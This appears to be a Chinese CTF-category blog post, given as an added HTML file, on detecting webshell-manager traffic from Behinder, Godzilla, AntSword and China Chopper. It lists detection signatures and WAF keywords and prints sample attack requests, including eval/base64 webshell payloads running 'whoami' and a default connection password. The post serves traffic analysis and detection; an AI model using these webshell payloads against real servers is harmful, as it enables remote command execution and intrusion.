@@ -1,0 +1,521 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <canvas id="fireworks" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"></canvas>
+    <script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+    <script src="/js/<file>"></script>
+    <link rel="stylesheet" href="/css/<file>" />
+    <script src="/js/fireworks.min.js"></script>
+    <canvas id="background" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"></canvas>
+    <script src="/js/background.min.js"></script>
+    <div id="cursor"></div>
+    <link rel="stylesheet" href="/css/cursor.min.css">
+    <script src="/js/cursor.min.js"></script>
+    <meta charset="utf-8" />
+    <title>冰蝎、哥斯拉、蚁剑、菜刀流量特征分析 | OvO</title>
+    <meta name="author" content="你猜不到的" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/kkk.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>OVO</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;OVO</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>冰蝎、哥斯拉、蚁剑、菜刀流量特征分析</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/10/28
+        </span>
+        
+        <span class="category">
+            <a href="/categories/CTF/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/misc/" style="color: #00a596">
+                    misc
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p><del>一个非常非常渣的流量学习（也许</del></p>
+<p>最近做了点ctf的题又做了点流量分析，想学习一下这四个常见工具很久了，正好取证题还在下载就来整理一下：）。</p>
+<span id="more"></span>
+<p>参考文章（滑跪：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Sgirll/article/details/131860510?sharetype=blogdetail&amp;shareId=131860510&amp;sharerefer=APP&amp;sharesource=2401_87851833&amp;sharefrom=qq">流量特征分析——蚁剑、菜刀、冰蝎、哥斯拉</a>、<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41314882/article/details/147333207?sharetype=blogdetail&amp;shareId=147333207&amp;sharerefer=APP&amp;sharesource=2401_87851833&amp;sharefrom=qq">Webshell管理工具 [流量分析总结文档 蚁剑、冰蝎、菜刀、哥斯拉]</a>、<a target="_blank" rel="noopener" href="https://blog.csdn.net/ai0070411/article/details/146318558?sharetype=blogdetail&amp;shareId=146318558&amp;sharerefer=APP&amp;sharesource=2401_87851833&amp;sharefrom=qq">最新冰蝎，哥斯拉，蚁剑，菜刀流量特征分析与检测指南</a>、<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_80064376/article/details/140279178?sharetype=blogdetail&amp;shareId=140279178&amp;sharerefer=APP&amp;sharesource=2401_87851833&amp;sharefrom=qq">哥斯拉、冰蝎与蚁剑的流量特征</a>。</p>
+<table>
+<thead>
+<tr class="header">
+<th>工具</th>
+<th>协议支持</th>
+<th>加密方式</th>
+<th>核心特点</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>冰蝎</td>
+<td>HTTP/HTTPS、自定义加密协议</td>
+<td>AES + 动态密钥交换</td>
+<td>全内存加载，无文件落地</td>
+</tr>
+<tr class="even">
+<td>哥斯拉</td>
+<td>HTTP/HTTPS</td>
+<td>XOR + 自定义变种算法</td>
+<td>支持多协议插件，流量高度伪装</td>
+</tr>
+<tr class="odd">
+<td>蚁剑</td>
+<td>HTTP/HTTPS</td>
+<td>Base64 + 异或</td>
+<td>模块化扩展，特征易被修改</td>
+</tr>
+<tr class="even">
+<td>菜刀</td>
+<td>HTTP/HTTPS、SOCKS5</td>
+<td>Base64 明文传输</td>
+<td>低版本特征固定，高版本可定制</td>
+</tr>
+</tbody>
+</table>
+<h4 id="冰蝎behinder">1. 冰蝎（Behinder）</h4>
+<p><strong>流量特征</strong>：</p>
+<p>主要表现在数据包中的特殊标记和传输的数据类型。冰蝎的数据包中包含了特定的标记，如“flag=0x52415631”，用于标识该数据包是冰蝎的控制命令。此外，冰蝎还使用了一种自定义的二进制协议，在通信中传输各种类型的数据。</p>
+<h5 id="冰蝎-2.0">冰蝎 2.0</h5>
+<p>1.使用<strong>AES加密+Base64编码</strong>，AES使用动态密钥对通信进行加密。请求时内置了十几个 User-Agent 头，每次请求时会随机选择其中的一个。因此，当发现一个IP的请求头中的<strong>User-Agent</strong>在频繁变换，就可能是冰蝎。</p>
+<p>2.Content-Length:16，16就是冰蝎2连接的特征。</p>
+<h5 id="冰蝎-3.0">冰蝎 3.0</h5>
+<p>1.冰蝎3.0取消了2.0的动态获取密钥，使用固定的连接密钥。AES加密的密钥为webshell连接密码的<strong>MD5的前16位</strong>，默认连接密码是rebeyond​。请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。</p>
+<p>2.application/xhtm1+xmlapplication/xmlapplication/signed- exchange属于弱特征。</p>
+<p>3.jsp抓包特征分析Content-Type: application/octet-stream这是一个强特征。查阅资料可知 octet-stream的意思是，只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件，后台接收参数只能有一个，而且只能是流(或者字节数组)。</p>
+<p>4.content-length长度为5720或5740(随Java版本改变)。</p>
+<h5 id="冰蝎-4.0">冰蝎 4.0</h5>
+<p>1.进行请求时内置了十几个 User-Agent 头，每次请求时会随机选择其中的一个。</p>
+<p>2.端口为49700左右，每次连接会递增。</p>
+<p>3.PHPwebshell存在固定代码。</p>
+<p>4.冰蝎通讯默认使用长连接，默认情况下，请求头和响应头里会带有 ​Connection: Keep-Alive​​，这可以作为辅助流量特征。</p>
+<p>5.webshell存在默认字符串，为默认连接密码的MD5的前16位。</p>
+<p>栗子：</p>
+<pre class="sourceCode yaml" id="cb1"><code class="sourceCode yaml"><div class="sourceLine" id="cb1-1" data-line-number="1">POST /api/health HTTP/1.1</div>
+<div class="sourceLine" id="cb1-2" data-line-number="2"><span class="fu">Host:</span><span class="at"> target.com</span></div>
+<div class="sourceLine" id="cb1-3" data-line-number="3"><span class="fu">User-Agent:</span><span class="at"> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</span></div>
+<div class="sourceLine" id="cb1-4" data-line-number="4"><span class="fu">Content-Type:</span><span class="at"> application/json</span></div>
+<div class="sourceLine" id="cb1-5" data-line-number="5"><span class="fu">Accept:</span><span class="at"> application/json</span></div>
+<div class="sourceLine" id="cb1-6" data-line-number="6"><span class="fu">Authorization:</span><span class="at"> Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ0YXJnZXQuY29tIiwiaWF0IjoxNzA0MjQwMDAwfQ.fake_signature</span></div>
+<div class="sourceLine" id="cb1-7" data-line-number="7"><span class="fu">X-Request-ID:</span><span class="at"> 550e8400-e29b-41d4-a716-446655440000</span></div>
+<div class="sourceLine" id="cb1-8" data-line-number="8"><span class="fu">Content-Length:</span><span class="at"> 156</span></div>
+<div class="sourceLine" id="cb1-9" data-line-number="9"></div>
+<div class="sourceLine" id="cb1-10" data-line-number="10"><span class="kw">{</span></div>
+<div class="sourceLine" id="cb1-11" data-line-number="11">  <span class="fu">"component":</span><span class="at"> </span><span class="st">"database"</span><span class="er">,</span></div>
+<div class="sourceLine" id="cb1-12" data-line-number="12">  <span class="fu">"metrics":</span><span class="at"> </span><span class="kw">{</span></div>
+<div class="sourceLine" id="cb1-13" data-line-number="13">    <span class="fu">"activeConnections":</span><span class="at"> 15</span><span class="kw">,</span></div>
+<div class="sourceLine" id="cb1-14" data-line-number="14">    <span class="fu">"maxConnections":</span><span class="at"> 100</span></div>
+<div class="sourceLine" id="cb1-15" data-line-number="15">  },</div>
+<div class="sourceLine" id="cb1-16" data-line-number="16">  <span class="fu">"checksum":</span><span class="at"> </span><span class="st">"kLj8oP3aqY5vT1wXmQ9aZc7rF0gH2jK4lM6nB8vD1iG3kJ5mN7oA9sC0uE2wH4qY6tI8zP0xR3vF5hJ7bL9dO2fQ4iK6aM8cP1eR3gT5jU7"</span></div>
+<div class="sourceLine" id="cb1-17" data-line-number="17">}</div></code></pre>
+<p>base64+AES解密后：</p>
+<pre class="sourceCode yaml" id="cb2"><code class="sourceCode yaml"><div class="sourceLine" id="cb2-1" data-line-number="1"><span class="kw">{</span></div>
+<div class="sourceLine" id="cb2-2" data-line-number="2">  <span class="fu">"type":</span><span class="at"> </span><span class="st">"cmd"</span><span class="er">,</span></div>
+<div class="sourceLine" id="cb2-3" data-line-number="3">  <span class="fu">"cmd":</span><span class="at"> </span><span class="st">"whoami"</span><span class="er">,</span></div>
+<div class="sourceLine" id="cb2-4" data-line-number="4">  <span class="fu">"path":</span><span class="at"> </span><span class="st">"C:\\\\"</span><span class="er">,</span></div>
+<div class="sourceLine" id="cb2-5" data-line-number="5">  <span class="fu">"session":</span><span class="at"> </span><span class="st">"7d4f3e2a-1b8c-4a9d-8e7f-6c5d4e3f2a1b"</span></div>
+<div class="sourceLine" id="cb2-6" data-line-number="6">}</div></code></pre>
+<h4 id="哥斯拉godzilla">2.哥斯拉（Godzilla）</h4>
+<p><strong>流量特征：</strong></p>
+<p>1.流量特征主要表现在<strong>数据包的特殊标记和数据类型</strong>。哥斯拉的数据包中包含了特定的标记，如“XORHEAD”和“XORBODY”，用于标识该数据包是哥斯拉的控制命令。此外，哥斯拉还使用了一种自定义的二进制协议，在通信中传输各种类型的数据。</p>
+<p>2.Cookie字段中存在一个关键的特征，即<strong>最后一个Cookie值的末尾有一个不必要的分号</strong>，在标准的HTTP请求中，最后一个Cookie的值后面不应该出现分号。</p>
+<p>3.<strong>响应包结构特征</strong>:MD5前16位+base64+MD5后16位</p>
+<p>栗子：</p>
+<pre class="sourceCode yaml" id="cb3"><code class="sourceCode yaml"><div class="sourceLine" id="cb3-1" data-line-number="1">POST /upload/images/template.jsp HTTP/1.1</div>
+<div class="sourceLine" id="cb3-2" data-line-number="2"><span class="fu">Host:</span><span class="at"> target-company.com</span></div>
+<div class="sourceLine" id="cb3-3" data-line-number="3"><span class="fu">User-Agent:</span><span class="at"> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span></div>
+<div class="sourceLine" id="cb3-4" data-line-number="4"><span class="fu">Accept:</span><span class="at"> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8</span></div>
+<div class="sourceLine" id="cb3-5" data-line-number="5"><span class="fu">Accept-Language:</span><span class="at"> zh-CN,zh;q=0.9,en;q=0.8</span></div>
+<div class="sourceLine" id="cb3-6" data-line-number="6"><span class="fu">Accept-Encoding:</span><span class="at"> gzip, deflate</span></div>
+<div class="sourceLine" id="cb3-7" data-line-number="7"><span class="fu">Connection:</span><span class="at"> keep-alive</span></div>
+<div class="sourceLine" id="cb3-8" data-line-number="8"><span class="fu">Cache-Control:</span><span class="at"> max-age=0</span></div>
+<div class="sourceLine" id="cb3-9" data-line-number="9"><span class="fu">Content-Type:</span><span class="at"> application/x-www-form-urlencoded</span></div>
+<div class="sourceLine" id="cb3-10" data-line-number="10"><span class="fu">Cookie:</span><span class="at"> JSESSIONID=AC9C9335F0B8421D8E392B314C3A1F32;</span></div>
+<div class="sourceLine" id="cb3-11" data-line-number="11"><span class="fu">Upgrade-Insecure-Requests:</span><span class="at"> 1</span></div>
+<div class="sourceLine" id="cb3-12" data-line-number="12"><span class="fu">Content-Length:</span><span class="at"> 342</span></div>
+<div class="sourceLine" id="cb3-13" data-line-number="13"></div>
+<div class="sourceLine" id="cb3-14" data-line-number="14">payload=UEsDBBQACAAIAFNlc2UAAAAAAAAAAAAAAAAZAAAAemV1cy5qc3Atsk1OwzAQhfc5xSxYtKJqF0gI</div>
+<div class="sourceLine" id="cb3-15" data-line-number="15">CSEhVl0gxMLE4ySOGttl7CkK5+4MpUVCLFjYfs+b92Y8T3hVpVJ8o1uTQ4YhxQhD8tC1XW9tD0mK</div>
+<div class="sourceLine" id="cb3-16" data-line-number="16">McWYfPZ9Z3sHKYUUQ4ohhRBC8tC1XW9tD0mKMcWYfPZ9Z3sHKYUUQ4ohhRBC8tC1XW9tD0mKMcWY</div>
+<div class="sourceLine" id="cb3-17" data-line-number="17"><span class="co">...</span></div></code></pre>
+<p><strong>识别方法</strong>：关注数据包的特殊标记和数据类型；关注cookie值和响应包特征。</p>
+<h4 id="蚁剑antsword">3.蚁剑（AntSword）</h4>
+<p><strong>流量特征：</strong></p>
+<p>1.<strong>Header</strong>：默认 User-Agent: AntSword/v2.1（可修改，但低权限用户可能保留）。</p>
+<p>2.在默认使用base64编码器的情况下，其流量虽然编码，但<strong>存在固定的起始和结束标记</strong>。</p>
+<p>例如，Payload通常以<strong><span class="citation" data-cites="ini_set">@ini_set</span>(…);<span class="citation" data-cites="set_time_limit">@set_time_limit</span>(0);…</strong>开头，经过Base64编码后，其开头部分（如 QGluaV9zZXQo…）相对固定，可以成为检测特征。</p>
+<p>3.响应特征：响应为文件列表或命令输出。</p>
+<p>栗子：</p>
+<pre class="sourceCode yaml" id="cb4"><code class="sourceCode yaml"><div class="sourceLine" id="cb4-1" data-line-number="1">POST /vendor/phpunit/autoload.php HTTP/1.1</div>
+<div class="sourceLine" id="cb4-2" data-line-number="2"><span class="fu">Host:</span><span class="at"> target.com</span></div>
+<div class="sourceLine" id="cb4-3" data-line-number="3"><span class="fu">User-Agent:</span><span class="at"> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</span></div>
+<div class="sourceLine" id="cb4-4" data-line-number="4"><span class="fu">Accept:</span><span class="at"> text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></div>
+<div class="sourceLine" id="cb4-5" data-line-number="5"><span class="fu">Accept-Language:</span><span class="at"> zh-CN,zh;q=0.9,en;q=0.8</span></div>
+<div class="sourceLine" id="cb4-6" data-line-number="6"><span class="fu">Content-Type:</span><span class="at"> application/x-www-form-urlencoded</span></div>
+<div class="sourceLine" id="cb4-7" data-line-number="7"><span class="fu">Content-Length:</span><span class="at"> 892</span></div>
+<div class="sourceLine" id="cb4-8" data-line-number="8"><span class="fu">Connection:</span><span class="at"> close</span></div>
+<div class="sourceLine" id="cb4-9" data-line-number="9"></div>
+<div class="sourceLine" id="cb4-10" data-line-number="10">_0x5c3d=%40%69%6e%69%5f%73%65%74%28%22%64%69%73%70%6c%61%79%5f%65%72%72%6f%72%73%22%2c%22%30%22%29%3b%40%73%65%74%5f%74%69%6d%65%5f%6c%69%6d%69%74%28%30%29%3b%66%75%6e%63%74%69%6f%6e%20%61%73%32%6e%64%65%33%28%24%63%29%7b%24%72%65%3d%22%22%3b%66%6f%72%28%24%69%3d%30%3b%24%69%3c%73%74%72%6c%65%6e%28%24%63%29%3b%24%69%2b%2b%29%7b%24%72%65%2e%3d%63%68%72%28%6f%72%64%28%24%63%7b%24%69%7d%29%2d%31%29%3b%7d%72%65%74%75%72%6e%20%24%72%65%3b%7d%65%76%61%6c%28%61%73%32%6e%64%65%33%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%27%4c%32%74%6a%62%59%57%78%6c%63%6d%56%7a%64%48%4a%70%59%32%56%6a%61%32%56%30%4c%6d%35%6c%64%47%56%79%64%58%56%75%58%33%42%68%62%6d%52%68%62%6d%64%6c%58%32%35%68%62%57%55%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%69%4f%69%49%79%4c%6d%64%76%62%32%64%73%5a%53%35%6a%62%32%30%27%29%29%29%3b</div></code></pre>
+<p>解码后：</p>
+<pre class="sourceCode yaml" id="cb5"><code class="sourceCode yaml"><div class="sourceLine" id="cb5-1" data-line-number="1">@ini_set(<span class="st">"display_errors"</span>,<span class="st">"0"</span>);@set_time_limit(0);function as2nde3($c)<span class="kw">{</span>$re="";for($i=0;$i&lt;strlen($c);$i++){$re.=chr(ord($c{$i<span class="kw">}</span>)-1);}return $re;}eval(as2nde3(base64_decode(<span class="st">'L2tjb...（非常长的Base64字符串）')));</span></div></code></pre>
+<p><strong>识别方法</strong>：检测 _0x 开头的参数名；检测请求中的固定开头 <span class="citation" data-cites="ini_set">@ini_set</span>(“display_errors”,“0”);<span class="citation" data-cites="set_time_limit">@set_time_limit</span>(0)。</p>
+<h4 id="菜刀chinachopper">4.菜刀（ChinaChopper）</h4>
+<p><strong>流量特征：</strong></p>
+<p>1.<strong>Header</strong>：Accept: text/html, image/gif, image/jpeg, <em>; q=.2, </em>/*; q=.2</p>
+<p>2.<strong>Body</strong>：eval(base64_decode($_POST[‘z0’])) 结构，参数名固定（如z0，z1，pass，cmd 等）。</p>
+<p>3.<strong>URL</strong>：路径简短（如 /admin.php），参数值长度固定为 16 倍数。</p>
+<p>4.<strong>User-Agent</strong>： 早期版本有固定的User-Agent，如 Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)。</p>
+<p><strong>WAF检测关键词</strong>： eval(base64_decode(， $_POST[‘z0’]， assert(， ExecuteGlobal。</p>
+<p>栗子：</p>
+<pre class="sourceCode yaml" id="cb6"><code class="sourceCode yaml"><div class="sourceLine" id="cb6-1" data-line-number="1">POST /shell.php HTTP/1.1</div>
+<div class="sourceLine" id="cb6-2" data-line-number="2"><span class="fu">Host:</span><span class="at"> victim.com</span></div>
+<div class="sourceLine" id="cb6-3" data-line-number="3"><span class="fu">User-Agent:</span><span class="at"> Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</span></div>
+<div class="sourceLine" id="cb6-4" data-line-number="4"><span class="fu">Content-Type:</span><span class="at"> application/x-www-form-urlencoded</span></div>
+<div class="sourceLine" id="cb6-5" data-line-number="5"><span class="fu">Content-Length:</span><span class="at"> 125</span></div>
+<div class="sourceLine" id="cb6-6" data-line-number="6"></div>
+<div class="sourceLine" id="cb6-7" data-line-number="7">z0=QGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ3oxJ10pKTs=&amp;z1=system(<span class="st">'whoami'</span>)</div></code></pre>
+<p>其中参数z0的值QGV2YWwoYmFzZTY0X…是Base64编码。解码后内容为：<span class="citation" data-cites="eval">@eval</span>(base64_decode($_POST[‘z1’]));。</p>
+<p><strong>识别方法</strong>：监控POST请求中的敏感关键字或base64编码。</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 OvO
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;你猜不到的
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+        <div>
+            备案号：
+            
+            
+            
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
